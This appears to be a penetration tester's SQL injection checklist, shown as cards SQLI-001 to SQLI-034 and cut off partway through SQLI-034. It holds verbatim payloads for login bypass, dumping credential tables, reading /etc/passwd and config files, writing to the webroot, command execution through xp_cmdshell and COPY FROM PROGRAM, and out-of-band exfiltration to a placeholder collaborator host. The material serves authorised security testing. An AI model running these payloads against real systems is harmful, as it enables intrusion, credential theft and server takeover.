# SQL Injection — Checklist

Expert per-attack **test-case matrix** for SQL Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*43 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SQLI-001 — Enumerate every input that reaches SQL
**Test Category:** Recon &amp; Sink Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** URL params, POST/form, JSON keys (incl. nested), cookies, logged headers

**Test Steps:** 1. Catalogue all inputs: query params, POST/form fields, JSON keys (including nested), cookies.<br>2. Include headers apps commonly log into SQL audit tables: User-Agent, Referer, X-Forwarded-For.<br>3. For each, note whether the value likely lands in a WHERE/ORDER BY/INSERT.

**Expected Result:** A complete list of parameters/headers that could reach a SQL query.

**Payload Example:**

```
id, q, search, sort, order, category, filter, limit, offset, user, User-Agent, X-Forwarded-For
```

**Impact:** Defines the SQLi attack surface; logged headers are unauthenticated second-order sinks people miss.

**Tools:** Burp Suite Pro, Arjun, ParamSpider

**References:** CWE-89; OWASP WSTG-INPV-05; PortSwigger Web Security Academy: SQL injection

---

## SQLI-002 — Prioritise high-yield sink types
**Test Category:** Recon &amp; Sink Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** login/auth, search/filter, ?sort=/?order=, pagination, export/report, GraphQL/REST resolvers

**Test Steps:** 1. Rank sinks by likelihood: login/auth (auth bypass), search/filter/?id= (UNION/blind), ?sort=/?order= (identifier context), pagination ?limit/offset.<br>2. Add export/report/PDF builders (often string-built + higher privilege) and GraphQL/REST resolvers.<br>3. Test the identifier/sort slot even on 'parameterized' apps - values are bound but column names often are not.

**Expected Result:** A prioritised test order concentrating on the most exploitable contexts.

**Payload Example:**

```
?sort=1 vs ?sort=2   (identifier probe)
?limit=1 / ?offset=0   (pagination)
```

**Impact:** Focuses effort; the ORDER BY/sort slot is routinely injectable where value-params are safely bound.

**Tools:** Burp Suite

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-003 — Grep source/JS for string-built (non-parameterized) SQL
**Test Category:** Recon &amp; Sink Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Gray-box: source, JS bundles, ORM raw escape hatches

**Test Steps:** 1. Search for concatenated SQL: execute("..."+x), query(`...${x}`), knex.raw, sequelize.literal, order(params[:sort]), String.format into SQL, find_by_sql.<br>2. Flag ORM raw escape hatches and dynamic ORDER BY.<br>3. Map each hit to a reachable endpoint/parameter.

**Expected Result:** Identified code paths that build SQL by concatenation rather than binding.

**Payload Example:**

```
grep -rEn "raw\(|literal\(|execute\(.+\+|query\(`.+\$\{|order\(params" .
```

**Impact:** Pinpoints the exact injectable sinks and proves root cause for the report.

**Tools:** ripgrep, Semgrep, Burp

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-004 — Flag second-order (stored-then-queried) sinks
**Test Category:** Recon &amp; Sink Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Values stored then later used in a query (username, display name, address, filename, comment)

**Test Steps:** 1. Identify inputs that are STORED then later used unsafely in a query by a different feature.<br>2. Common: registration username/display-name used by admin search/report; filename used by a job.<br>3. Plan to plant a payload now, trigger the consumer later.

**Expected Result:** A list of stored fields whose later consumption may be injectable.

**Payload Example:**

```
register username = tester' -> later admin report runs ...WHERE name='tester'...
```

**Impact:** Second-order SQLi bypasses input-facing WAFs and often runs at higher privilege.

**Tools:** Burp Suite

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-005 — 60-second triage — break the query
**Test Category:** Detection — Baseline · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Any candidate parameter

**Test Steps:** 1. Send a normal value, then ' , " , ) , ') and the arithmetic test 2-1 vs 1.<br>2. Watch status / length / body / timing for each.<br>3. A SQL error, a changed page, or 2-1 returning the id=1 row signals injectability.

**Expected Result:** A quote/paren causes a SQL error or altered response, or 2-1 returns row 1 (numeric context).

**Payload Example:**

```
id=1'
id=1"
id=1)   id=1')
id=2-1   (returns the id=1 row => numeric, injectable)
```

**Impact:** First, fast signal that a parameter reaches SQL and how the query is framed.

**Tools:** Burp Repeater, curl

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-006 — Classify injection context
**Test Category:** Detection — Baseline · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Confirmed candidate parameter

**Test Steps:** 1. Decide the context: STRING ('...'), NUMERIC (id=1), IDENTIFIER (ORDER BY/column), or LIKE.<br>2. Confirm with a true/false pair matching the context.<br>3. Context dictates every payload that follows.

**Expected Result:** The parameter's SQL context is identified (string/numeric/identifier/LIKE).

**Payload Example:**

```
STRING: ' AND '1'='1  vs  ' AND '1'='2
NUMERIC: 1 AND 1=1  vs  1 AND 1=2
IDENTIFIER: ?sort=1 vs ?sort=2
LIKE: %' OR '1'='1'-- -
```

**Impact:** Wrong context = wrong payload; correct classification makes exploitation deterministic.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-007 — Fingerprint the DBMS
**Test Category:** Detection — Baseline · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Confirmed injection point

**Test Steps:** 1. Read error text; test concat behaviour: CONCAT (MySQL) vs || (PG/Oracle/SQLite) vs + (MSSQL).<br>2. Test comment styles (# MySQL) and version functions.<br>3. Confirm with a DBMS-specific time delay (SLEEP vs pg_sleep vs WAITFOR).

**Expected Result:** The backend DBMS (MySQL/PostgreSQL/MSSQL/Oracle/SQLite) is identified.

**Payload Example:**

```
MySQL: ' AND SLEEP(5)-- -
PG: '; SELECT pg_sleep(5)-- -
MSSQL: '; WAITFOR DELAY '0:0:5'-- -
Oracle: dbms_pipe.receive_message
```

**Impact:** DBMS choice determines the entire payload set for extraction, files, and RCE.

**Tools:** Burp Repeater, sqlmap --fingerprint

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection

---

## SQLI-008 — String-context breakout
**Test Category:** Detection — Context Breakout · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Value inside '...' in the query

**Test Steps:** 1. Close the string with ' and confirm error.<br>2. Comment the rest with '-- - (trailing space), '# or '/*.<br>3. Prove boolean with ' AND '1'='1 (true) vs ' AND '1'='2 (false).

**Expected Result:** Quote closes the string (error), comment neutralises the rest, and the boolean pair differs.

**Payload Example:**

```
'-- -
' OR '1'='1'-- -
' AND '1'='1   vs   ' AND '1'='2
```

**Impact:** Establishes control of a string-context query - the foundation for extraction/auth-bypass.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-009 — Numeric-context breakout
**Test Category:** Detection — Context Breakout · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Bare numeric value (id=1)

**Test Steps:** 1. Inject bare (no quote): 1 OR 1=1, 1 AND 1=2, 2-1.<br>2. Confirm 2-1 returns row 1 (math evaluated server-side).<br>3. Use 1 OR 1=1-- - to break out.

**Expected Result:** Arithmetic is evaluated and boolean conditions change the result set without any quote.

**Payload Example:**

```
1 OR 1=1-- -
1 AND 1=2
2-1   (= row 1)
```

**Impact:** Numeric context needs no quote-escaping - often the cleanest injection to exploit.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-010 — Paren/function-wrapper breakout
**Test Category:** Detection — Context Breakout · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Value inside func('INPUT') or nested parens

**Test Steps:** 1. The error reveals how many parens to close.<br>2. Try ')-- -, '))-- -, ') OR ('1'='1.<br>3. Balance parens then inject.

**Expected Result:** Closing the correct number of parentheses removes the error and lets the injected logic run.

**Payload Example:**

```
')-- -
'))-- -
') OR ('1'='1
```

**Impact:** Handles wrapped queries (e.g. WHERE (col='x')) that a plain quote can't break.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-011 — Identifier-context injection (ORDER BY / column)
**Test Category:** Detection — Context Breakout · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ?sort=/?order=/column-name slots (NO quotes) - often missed on 'parameterized' apps

**Test Steps:** 1. Values may be bound but column/sort names are concatenated raw.<br>2. Column-index probe: ?sort=1 vs ?sort=2 (different ordering = injectable).<br>3. Boolean via ordering: (CASE WHEN (1=1) THEN name ELSE id END).<br>4. Time via subquery: (SELECT 1 FROM (SELECT SLEEP(5))x).

**Expected Result:** Different ordering per column index, or a CASE/subquery in the sort slot changes ordering/timing.

**Payload Example:**

```
?sort=(CASE WHEN (1=1) THEN name ELSE id END)
?sort=(SELECT 1 FROM (SELECT SLEEP(5))x)
```

**Impact:** The identifier slot is injectable where value-params are safely bound - a frequently-overlooked win.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-012 — LIKE-context breakout
**Test Category:** Detection — Context Breakout · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Value inside LIKE 'INPUT%'

**Test Steps:** 1. Account for the trailing % wildcard.<br>2. Close the string and comment: %' OR '1'='1'-- -.<br>3. Confirm result-set change.

**Expected Result:** The LIKE clause is broken, injected logic runs, and results change.

**Payload Example:**

```
%' OR '1'='1'-- -
```

**Impact:** Search boxes often use LIKE; this handles the extra wildcard the string breakout misses.

**Tools:** Burp Repeater

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-013 — Error-based extraction — MySQL
**Test Category:** Detection — Error-Based · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** String/numeric sink where DB errors are shown

**Test Steps:** 1. Trigger extractvalue/updatexml to leak ~32 chars per shot.<br>2. Or use the floor(rand)*2 count(*) duplicate-key technique.<br>3. Iterate SUBSTRING to page through longer values.

**Expected Result:** The DB error message contains the queried value (version/user/database) after a ~ marker.

**Payload Example:**

```
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
```

**Impact:** Fast, reliable in-band extraction when verbose errors are shown - no blind guessing needed.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-014 — Error-based extraction — PostgreSQL
**Test Category:** Detection — Error-Based · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** PG sink with errors shown

**Test Steps:** 1. Force a text-&gt;int cast error carrying the value.<br>2. Use string_agg to pull multiple rows into one error.<br>3. Iterate as needed.

**Expected Result:** The cast error message discloses version()/user data.

**Payload Example:**

```
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT string_agg(usename,',') FROM pg_user) AS int)-- -
```

**Impact:** In-band extraction on PostgreSQL via type-confusion errors.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-015 — Error-based extraction — MSSQL
**Test Category:** Detection — Error-Based · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** MSSQL sink with errors shown

**Test Steps:** 1. Force a conversion error that leaks the value.<br>2. Target sysobjects/sys.sql_logins for schema/creds.<br>3. Page with TOP/OFFSET.

**Expected Result:** The CONVERT error message discloses @@version or object/login names.

**Payload Example:**

```
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
```

**Impact:** In-band extraction on MSSQL via conversion errors.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-016 — Error-based extraction — Oracle
**Test Category:** Detection — Error-Based · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Oracle sink with errors shown

**Test Steps:** 1. Use UTL_INADDR.GET_HOST_NAME or CTXSYS.DRITHSX.SN to carry the value in an ORA error.<br>2. Add FROM dual and rownum=1 as required.<br>3. Iterate SUBSTR for longer values.

**Expected Result:** The ORA-error message contains the queried value.

**Payload Example:**

```
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
```

**Impact:** In-band extraction on Oracle via error-carrying functions.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-017 — Boolean-based blind extraction
**Test Category:** Detection — Blind (Boolean) · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Silent sink with a stable true/false response difference

**Test Steps:** 1. Confirm AND 1=1 vs AND 1=2 give a stable, repeatable different response.<br>2. Binary-search length then chars: ASCII(SUBSTRING((SELECT database()),1,1))&gt;100.<br>3. Enumerate via count(*) existence checks.

**Expected Result:** AND 1=1 and AND 1=2 yield consistently different responses; char comparisons page out data.

**Payload Example:**

```
' AND (SELECT LENGTH(@@version))>10-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -
```

**Impact:** Full data extraction with no errors and no visible output - works on most 'silent' sinks.

**Tools:** Burp Intruder, sqlmap, poc/sqli_blind.py

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-018 — Time-based blind — MySQL
**Test Category:** Detection — Blind (Time) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fully blind sink (no error, no boolean diff), MySQL

**Test Steps:** 1. Confirm SLEEP(5) delays while SLEEP(0) is fast, repeatably.<br>2. Make it conditional to extract: IF(condition,SLEEP(5),0).<br>3. Binary-search chars via the delay oracle.

**Expected Result:** SLEEP(5) delays ~5s consistently; SLEEP(0) returns fast - a reliable timing oracle.

**Payload Example:**

```
' AND SLEEP(5)-- -
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)-- -
```

**Impact:** Extraction when the only signal is response time - the last-resort but universal blind method.

**Tools:** Burp Intruder, sqlmap, poc/sqli_blind.py

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-019 — Time-based blind — PostgreSQL
**Test Category:** Detection — Blind (Time) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fully blind sink, PostgreSQL

**Test Steps:** 1. Confirm pg_sleep(5) delay.<br>2. Conditional via CASE WHEN.<br>3. Binary-search extraction.

**Expected Result:** pg_sleep(5) delays consistently under the injected condition.

**Payload Example:**

```
'; SELECT pg_sleep(5)-- -
' AND 1=(CASE WHEN(1=1) THEN(SELECT 1 FROM pg_sleep(5)) ELSE 1 END)-- -
```

**Impact:** Universal blind extraction on PostgreSQL.

**Tools:** Burp Intruder, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-020 — Time-based blind — MSSQL
**Test Category:** Detection — Blind (Time) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fully blind sink, MSSQL

**Test Steps:** 1. Confirm WAITFOR DELAY '0:0:5' delay.<br>2. Conditional via IF.<br>3. Extract char-by-char.

**Expected Result:** WAITFOR DELAY causes a consistent delay under the injected condition.

**Payload Example:**

```
'; WAITFOR DELAY '0:0:5'-- -
' IF(1=1) WAITFOR DELAY '0:0:5'-- -
```

**Impact:** Universal blind extraction on MSSQL.

**Tools:** Burp Intruder, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-021 — Time-based blind — Oracle
**Test Category:** Detection — Blind (Time) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fully blind sink, Oracle

**Test Steps:** 1. Use dbms_pipe.receive_message for a timed wait.<br>2. Conditional via CASE WHEN.<br>3. Extract via the delay oracle.

**Expected Result:** dbms_pipe.receive_message delays under the injected condition.

**Payload Example:**

```
' AND 1=(CASE WHEN(1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -
```

**Impact:** Universal blind extraction on Oracle.

**Tools:** Burp Intruder, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-022 — UNION-based — determine column count
**Test Category:** Detection — UNION · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** In-band sink where results are rendered

**Test Steps:** 1. Climb ORDER BY N until it errors (count = N-1).<br>2. Or add NULLs: UNION SELECT NULL, NULL,... until no error (exact count).<br>3. Oracle needs FROM dual.

**Expected Result:** ORDER BY errors at N, or UNION SELECT NULLxN stops erroring at the exact column count.

**Payload Example:**

```
' ORDER BY 1-- -   ' ORDER BY 2-- -  ...
' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -  ...
```

**Impact:** Column count is the prerequisite for UNION data extraction.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-023 — UNION-based — extract data via visible column
**Test Category:** Detection — UNION · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** In-band sink, column count known

**Test Steps:** 1. Find a visible string column by rotating a marker: UNION SELECT 'a',NULL,...<br>2. Concatenate target data into it (CONCAT/||/+ per DBMS; GROUP_CONCAT/string_agg to pack rows).<br>3. Pull version() and one benign row first.

**Expected Result:** The injected marker/data appears in the response in the visible column position.

**Payload Example:**

```
' UNION SELECT CONCAT(user,0x3a,authentication_string),NULL FROM mysql.user-- -
' UNION SELECT usename||':'||passwd,NULL FROM pg_shadow-- -
```

**Impact:** Direct, fast in-band data theft (versions, schema, credentials) once a visible column is found.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-024 — Out-of-band (OOB) extraction
**Test Category:** Detection — OOB · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Fully blind/firewalled sink; DBMS with OOB primitives

**Test Steps:** 1. Get a Collaborator/interactsh host; put database()/user as the SUBDOMAIN.<br>2. MSSQL xp_dirtree/xp_fileexist (DNS/SMB); Oracle UTL_INADDR/DBMS_LDAP; PG COPY..TO PROGRAM nslookup; MySQL(Win) LOAD_FILE UNC.<br>3. Read the DNS log - one hit carrying database() = proof.

**Expected Result:** An OOB DNS/HTTP callback arrives carrying the exfiltrated value as a subdomain.

**Payload Example:**

```
'; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.$COLLAB\a'-- -
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.$COLLAB')) IS NOT NULL-- -
```

**Impact:** Extracts data when there is no in-band or timing signal - irrefutable, fast proof.

**Tools:** Burp Collaborator, interactsh, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection

---

## SQLI-025 — Stacked queries — detect &amp; use
**Test Category:** Detection — Stacked · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Drivers allowing multiple statements (PG/MSSQL/SQLite; usually not mysqli)

**Test Steps:** 1. Test a delay on a SECOND statement: '; SELECT pg_sleep(5)-- - or '; WAITFOR DELAY '0:0:5'-- -.<br>2. If it delays, stacking is enabled.<br>3. Use for writes/RCE ONLY on your own test row, benignly.

**Expected Result:** A delay from the second statement confirms stacked queries execute.

**Payload Example:**

```
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
```

**Impact:** Stacked queries unlock writes, xp_cmdshell, and COPY..FROM PROGRAM - the path to RCE.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-026 — Authentication bypass
**Test Category:** Impact — Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login builds WHERE user='$u' AND pass='$p'

**Test Steps:** 1. Comment out the password: admin'-- - (or admin'# / admin'/*).<br>2. Always-true first/any user: ' OR 1=1 LIMIT 1-- -.<br>3. Target a user: admin' AND '1'='1'-- -. Numeric id login: 1 OR 1=1-- -.<br>4. Note which account you land as (admin = Critical).

**Expected Result:** You authenticate without valid credentials, landing as an existing (ideally admin) account.

**Payload Example:**

```
admin'-- -
' OR 1=1 LIMIT 1-- -
admin' AND '1'='1'-- -
```

**Impact:** Direct account takeover; as admin it is full application compromise.

**Tools:** Burp Repeater

**References:** CWE-89; CWE-287; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-027 — Schema enumeration
**Test Category:** Impact — Data Disclosure · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any working extraction technique

**Test Steps:** 1. DBs: information_schema.schemata (MSSQL sys.databases; Oracle all_tables; SQLite sqlite_master).<br>2. Tables in current DB; then columns of interesting tables (users/accounts/admin/auth).<br>3. Locate password/password_hash/passwd columns.

**Expected Result:** Database/table/column names are enumerated, revealing where credentials/PII live.

**Payload Example:**

```
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**Impact:** Maps the database and pinpoints sensitive tables for a targeted, bounded proof.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-028 — Bounded data extraction (benign proof)
**Test Category:** Impact — Data Disclosure · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Confirmed extraction technique + located sensitive table

**Test Steps:** 1. Pull version() plus ONE benign sample row and a COUNT - never the whole table.<br>2. Redact secrets in the report.<br>3. Describe the full-dump impact without performing it.

**Expected Result:** version() plus a single sample row and row count are retrieved as proof.

**Payload Example:**

```
' UNION SELECT @@version,NULL-- -
' UNION SELECT CONCAT(email,0x3a,LEFT(password_hash,6)),NULL FROM users LIMIT 1-- -
```

**Impact:** Proves mass data theft (PII/credentials) with a safe, bounded PoC - Critical if hashes/PII exposed.

**Tools:** Burp Repeater, sqlmap (--dump limited)

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; OWASP WSTG-INPV-05

---

## SQLI-029 — File read — MySQL LOAD_FILE
**Test Category:** Impact — File Read · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** MySQL with FILE priv + permissive secure_file_priv

**Test Steps:** 1. Read a benign file to prove: LOAD_FILE('/etc/passwd').<br>2. Then config/source: /var/www/html/config.php, .env.<br>3. Concatenate into a visible/UNION column.

**Expected Result:** The file contents are returned in the response.

**Payload Example:**

```
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -
```

**Impact:** Local file disclosure (configs, secrets, source) - often reveals DB creds and further bugs.

**Tools:** Burp Repeater, sqlmap --file-read

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-030 — File read — PostgreSQL / MSSQL / Oracle
**Test Category:** Impact — File Read · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** PG superuser / MSSQL bulk-ops / Oracle directory object

**Test Steps:** 1. PG: pg_read_file('/etc/passwd',0,100000) or COPY t FROM '/etc/passwd'.<br>2. MSSQL: OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB).<br>3. Oracle: UTL_FILE.GET_LINE on a DIRECTORY object.

**Expected Result:** The target file's contents are returned.

**Payload Example:**

```
SELECT pg_read_file('/etc/passwd',0,100000)
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB) x-- -
```

**Impact:** Local file disclosure across the non-MySQL engines - configs, secrets, source code.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection

---

## SQLI-031 — File write -&gt; webshell (benign PoC)
**Test Category:** Impact — File Write · **Severity:** Critical · **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** MySQL INTO OUTFILE / PG COPY TO, with write priv + known web-served dir

**Test Steps:** 1. Prereqs: write priv + known absolute webroot + that dir is web-served + file funcs enabled.<br>2. Write a BENIGN marker (random token) to s.txt and fetch it over HTTP to prove write+serve.<br>3. Do NOT drop a live shell on a bounty target.

**Expected Result:** A benign marker file is written to the webroot and retrievable over HTTP.

**Payload Example:**

```
' UNION SELECT '<benign-token>',NULL INTO OUTFILE '$WEBROOT/marker.txt'-- -
'; COPY (SELECT '<benign-token>') TO '$WEBROOT/marker.txt'-- -
```

**Impact:** Proves arbitrary file write to the webroot - one step from RCE, demonstrated safely.

**Tools:** Burp Repeater

**References:** CWE-89; CWE-73; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-032 — RCE — MSSQL xp_cmdshell
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** MSSQL sysadmin + stacked queries

**Test Steps:** 1. Enable if needed: sp_configure 'xp_cmdshell',1; RECONFIGURE.<br>2. Run ONE benign command: xp_cmdshell 'whoami'.<br>3. Capture one line (inline/temp-table/OOB), then STOP.

**Expected Result:** The output of a single benign OS command (whoami) is returned.

**Payload Example:**

```
'; EXEC master..xp_cmdshell 'whoami'-- -
```

**Impact:** Remote code execution on the DB server - Critical; lead the report with it.

**Tools:** Burp Repeater, sqlmap --os-shell

**References:** CWE-89; CWE-78; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection

---

## SQLI-033 — RCE — PostgreSQL COPY..FROM PROGRAM
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PG superuser &gt;=9.3 (CVE-2019-9193), stacked queries

**Test Steps:** 1. CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd.<br>2. Capture one benign line, then STOP.<br>3. Alt: untrusted PL/Python or PL/Perl.

**Expected Result:** The output of a single benign command (id) is returned via the table.

**Payload Example:**

```
'; CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd-- -
```

**Impact:** Remote code execution on PostgreSQL - Critical.

**Tools:** Burp Repeater, sqlmap

**References:** CWE-89; CWE-78; PostgreSQL CVE-2019-9193; PortSwigger Web Security Academy: SQL injection

---

## SQLI-034 — RCE — MySQL UDF / Oracle scheduler
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** MySQL FILE+writable plugin_dir / Oracle DBMS_SCHEDULER or Java proc

**Test Steps:** 1. MySQL (high bar): write lib_mysqludf_sys.so via INTO DUMPFILE, CREATE FUNCTION sys_exec, SELECT sys_exec('id').<br>2. Oracle: DBMS_SCHEDULER / Java stored proc runtime.exec (privilege-dependent).<br>3. Usually easier on MySQL: file-write -&gt; webshell.

